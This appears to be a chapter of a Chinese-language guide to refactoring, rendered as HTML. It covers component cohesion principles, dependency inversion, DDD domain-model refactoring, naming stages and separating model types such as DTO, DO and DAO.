&lt;h3&gt;&lt;a id="user-content-组件聚合三原则" class="anchor" aria-hidden="true" href="#组件聚合三原则"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;组件聚合三原则&lt;/h3&gt;
&lt;p&gt;在我们设计软件工程的时候，我们&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/components-rules.png"&gt;&lt;img src="images/components-rules.png" alt="组件聚合" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Bob 大叔在书中提到了三个原则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;复用/发布等同原则（REP）。软件复用的最小粒度等同于其发布的最小粒度。&lt;/li&gt;
&lt;li&gt;共同闭包原则（CCP）。我们应该将那些会同时修改，并且为相同目的而修改的类放到同一个组件中，而将不会同时修改，并且不会为了相同目的而修改的那些类放到不同组件中。&lt;/li&gt;
&lt;li&gt;共同复用原则（CRP）。不要强迫一个组件的用户依赖他们不需要的东西。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不过，其实按我的理解，第一条原则讲的是合理、有效的包发布策略；而后两条原则，只需要满足我们的模块/包满足开闭原则、单一职责，就可以合理地解决整个流程了。不过，这三个原则可以合理地解释在软件生命周期中，我们应该如何管理模块。&lt;/p&gt;
&lt;p&gt;因此，对于自家的模块只需要：&lt;strong&gt;根据技术、业务划分包，形成上下文边界，防止代码越界&lt;/strong&gt;。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-打破包之间的依赖关系" class="anchor" aria-hidden="true" href="#打破包之间的依赖关系"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;打破包之间的依赖关系&lt;/h3&gt;
&lt;p&gt;这一步理论上来看，倒也是蛮简单的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;从 Gradle / Maven 找到想去除的依赖&lt;/li&gt;
&lt;li&gt;全局搜索依赖的包名&lt;/li&gt;
&lt;li&gt;解决依赖
&lt;ul&gt;
&lt;li&gt;提取到类库中&lt;/li&gt;
&lt;li&gt;剥离并使用依赖注入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;删除依赖的包&lt;/li&gt;
&lt;li&gt;执行构建和 E2E 测试&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;TBC。工具还在写，目前主要要看人眼识别。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-依赖倒置" class="anchor" aria-hidden="true" href="#依赖倒置"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;依赖倒置&lt;/h3&gt;
&lt;p&gt;为此，我们可能需要寻找一些合适的依赖注入框架：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Java。Spring，Dagger 2，Guice 等等&lt;/li&gt;
&lt;li&gt;Go。Facebook  Inject、Uber Dig、Google Wire 等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对了，静态语言呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不需要。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-更好的面向对象" class="anchor" aria-hidden="true" href="#更好的面向对象"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;更好的面向对象&lt;/h4&gt;
&lt;p&gt;事实上，如果我们把面向对象做好的话，那么对应的逻辑就会封装到相应的对象中。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-清理垃圾代码" class="anchor" aria-hidden="true" href="#清理垃圾代码"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;清理垃圾代码&lt;/h3&gt;
&lt;p&gt;未使用的类，未使用方法。&lt;/p&gt;
&lt;p&gt;它根本不知道什么时候会使用到，又或者是它已经通过多态来实现。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-模型重构" class="anchor" aria-hidden="true" href="#模型重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;模型重构&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;小步前进，拉一下最新的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;架构元模型定义了模型中使用的概念和使用规则。 —— 《架构师修炼之道》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你可以将其对比于领域模型。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-聚合行为" class="anchor" aria-hidden="true" href="#聚合行为"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;聚合行为&lt;/h3&gt;
&lt;p&gt;对于领域模型来说，我们也无法直接在代码中实现架构元模型的所有概念。但是，我们所要做的事不断减少模型与代码之间的差异。如果我们不创建模式，而直接开始编写代码，那么我们会收获一堆上帝类。但是，反过来，当我们有一堆上帝类的时候，那么我们就需要从类中把行为都抽取出来。&lt;/p&gt;
&lt;p&gt;当我们的贫血模型，拥有了行为，就可以进一步构成富血模型，符合面向对象（OO）的思想。进一步的，我们可以从业务的角度来考虑这个问题，将充血模型改为领域模型。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-由内到外剥离由外到内聚合" class="anchor" aria-hidden="true" href="#由内到外剥离由外到内聚合"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;由内到外剥离，由外到内聚合&lt;/h4&gt;
&lt;p&gt;对于那些已经采用 DDD 架构的项目来说，往往会遇到一些领域模型不完整、包含非领域相关代码等的情况。&lt;/p&gt;
&lt;p&gt;遇到这种情况时，可以尝试：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;由内到外剥离非模型相关代码。只需要浏览一遍领域模型相关的代码，然后剥离不属于模型的代码；通过依赖注入、工厂模式等方式，建立整洁的 domain 层。&lt;/li&gt;
&lt;li&gt;由外到内聚合领域模型相关逻辑。这是一个复杂的过程，需要每个使用到模型的调用方，再看是属于领域相关的行为。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一步可以在短期内快速实现，而第二步则需要一个漫长的过长 —— 取决于项目的大小。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-识别模式-1输入参数" class="anchor" aria-hidden="true" href="#识别模式-1输入参数"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;识别模式 1：输入参数&lt;/h4&gt;
&lt;p&gt;你懂的&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-识别模式-2返回参数" class="anchor" aria-hidden="true" href="#识别模式-2返回参数"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;识别模式 2：返回参数&lt;/h4&gt;
&lt;p&gt;你懂的&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-优化创建" class="anchor" aria-hidden="true" href="#优化创建"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;优化创建&lt;/h4&gt;
&lt;p&gt;笔者在某个重构项目中，遇到模型的创建逻辑很复杂 —— 参数多、场景多，所以做的第一件事情是：使用工厂模式优化了创建过程。&lt;/p&gt;
&lt;p&gt;参考工厂模式。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重命名统一语言" class="anchor" aria-hidden="true" href="#重命名统一语言"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重命名：统一语言&lt;/h3&gt;
&lt;p&gt;在 DDD 中强调了统一语言的重要性，为此我们有必要对代码中的模型名称及其行为进行检视。在软件工程实践不好的团队中，你往往会出现&lt;strong&gt;对于同一个事件，往往会有多种命名方式&lt;/strong&gt;。哪怕你觉得它是不正确的，因为 ownership 的缺乏，也没有人来统一对应的命名。&lt;/p&gt;
&lt;p&gt;所以，在我们决定继续往下走之前，先学习一下怎么命名。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;计算机科学只存在两个难题：缓存失效和命名。 —— Phil KarIton&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/7_stages_of_naming.png"&gt;&lt;img src="images/7_stages_of_naming.png" alt="Arlo Belshee 命名的七步骤" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原文链接：&lt;a href="https://www.digdeeproots.com/articles/on/naming-as-a-process/" rel="nofollow"&gt;naming is a process&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是还是更习惯于原来的文章中的：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;阶段&lt;/th&gt;
&lt;th&gt;解释&lt;/th&gt;
&lt;th&gt;示例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;空白&lt;/td&gt;
&lt;td&gt;没有名称&lt;/td&gt;
&lt;td&gt;doSomething()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;凑合&lt;/td&gt;
&lt;td&gt;名称不能准确反应元素的含义&lt;/td&gt;
&lt;td&gt;preload()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;沾边&lt;/td&gt;
&lt;td&gt;名称至少反映了元素某一方面的功能&lt;/td&gt;
&lt;td&gt;DomSomethingEvilToDB()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;反映功能&lt;/td&gt;
&lt;td&gt;名称直接描述了元素的所有功能&lt;/td&gt;
&lt;td&gt;ParseXmlAndStoreFightToDbAndLocalCacheAndStartProcessing()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;反映角色&lt;/td&gt;
&lt;td&gt;名称充分地反映了元素在架构中的角色&lt;/td&gt;
&lt;td&gt;StoreFightlightToDatabaseAndStartProcessing&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;反映意图&lt;/td&gt;
&lt;td&gt;名称不仅反映元素的功能，还能反映其目的。&lt;/td&gt;
&lt;td&gt;BeginTrackingFlight()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;领域抽象&lt;/td&gt;
&lt;td&gt;名称超越了单个元素本身，成为一个新的抽象概念。&lt;/td&gt;
&lt;td&gt;MonitoringPanle.Add(new Flight())&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;偶然间，我看到我找到我书架上的《重构与模式》时，刚好看到一本《实现模式》，顺便看了看，发现书的内容对于本文有启发意义。&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/implementation-patterns.png"&gt;&lt;img src="images/implementation-patterns.png" alt="《实现模式》概览" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;书中提及了四五种类型类、状态、消息与流（原行为）、方法，但是对于我们的统一语言工作来说，只需要重命名类、方法、状态就够了。&lt;/p&gt;
&lt;p&gt;对应的解释如下：&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-类" class="anchor" aria-hidden="true" href="#类"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;类&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;数据的变化比逻辑要繁琐得多，正是这种现象让类有了存在的意义。—— 《实现模式》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对于继承的类来说，它应该遵循这么一些原则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;超类名称要简单&lt;/li&gt;
&lt;li&gt;子类名称要合格&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-状态" class="anchor" aria-hidden="true" href="#状态"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;状态&lt;/h4&gt;
&lt;p&gt;状态包含了变量、字段、常量、局部参数、参数、参数对象等等。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-方法" class="anchor" aria-hidden="true" href="#方法"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;方法&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;在命名类和操作时要描述它们的效果和目的，而不要表露它们是通过何种方式达到目。 —— Eric Evans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;&lt;a id="user-content-容器" class="anchor" aria-hidden="true" href="#容器"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;容器&lt;/h4&gt;
&lt;h3&gt;&lt;a id="user-content-离心分离模型消除二义性" class="anchor" aria-hidden="true" href="#离心分离模型消除二义性"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;离心分离模型：消除二义性&lt;/h3&gt;
&lt;p&gt;接下来就是处理剩下的 bean、model 等等模型。&lt;/p&gt;
&lt;p&gt;在一个系统中，你会存在这么一些不同的 model：&lt;/p&gt;
&lt;p&gt;（PS：部分描述可能不准确，欢迎指正）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;与数据库表结构对应的 DO（ Data Object）/ PO(Persistant Object)。&lt;/li&gt;
&lt;li&gt;查询数据的 Query、Request。&lt;/li&gt;
&lt;li&gt;对外传输的对象：DTO（ Data Transfer Object）。&lt;/li&gt;
&lt;li&gt;业务层之间的数据对象：VO（Value Object） / BO（Business Object)。&lt;/li&gt;
&lt;li&gt;访问数据库的：DAO (Data Access Object数据访问对象)。&lt;/li&gt;
&lt;li&gt;以及我们想要的 DDD 中的实体 Entity&lt;/li&gt;
&lt;li&gt;还有其它的 POJO（ Plain Ordinary Java Object）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但是它们都是 model，所以它们都被扔到 model 中……，又或者是 bean 中……。导致，你有了一个巨大比的 model 层。&lt;/p&gt;
&lt;p&gt;所以，在 DDD 又或者是 Clean Architecture，我们重新命名了不同的模式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 Command / Request 作为输入参数。其中的 Command 模式在完成后需要发出对应的 Event。&lt;/li&gt;
&lt;li&gt;使用 Response / DTO / Representation 作为返回结果。&lt;/li&gt;
&lt;li&gt;对 Entity 大家保持了一致的意见&lt;/li&gt;
&lt;li&gt;还有 PO / DO 作为作为数据库的存储模型&lt;/li&gt;
&lt;li&gt;DAO 作为数据库的访问模型&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不过，其实你只要不再让使用 model 和 bean，相似会有更多地收获。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-提取参数对象" class="anchor" aria-hidden="true" href="#提取参数对象"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;提取参数对象&lt;/h3&gt;
&lt;p&gt;如果一个类包含大量的参数，并且参数中存在一些相似的情形。对于概念统一的情况，可以提取成参数对象。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-处理过程逻辑" class="anchor" aria-hidden="true" href="#处理过程逻辑"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;处理过程逻辑&lt;/h3&gt;
&lt;p&gt;过程不应该模型的一部分，但是它是领域的一部分。&lt;/p&gt;
&lt;p&gt;如 Eric Evans 在所说，区分是否显式表达概念的关键在于：过程是否经常被领域专家谈起，又或者只是计算机程序机制的一部分。&lt;/p&gt;
&lt;p&gt;这时候，我们就需要规格（Specification）模式。&lt;/p&gt;
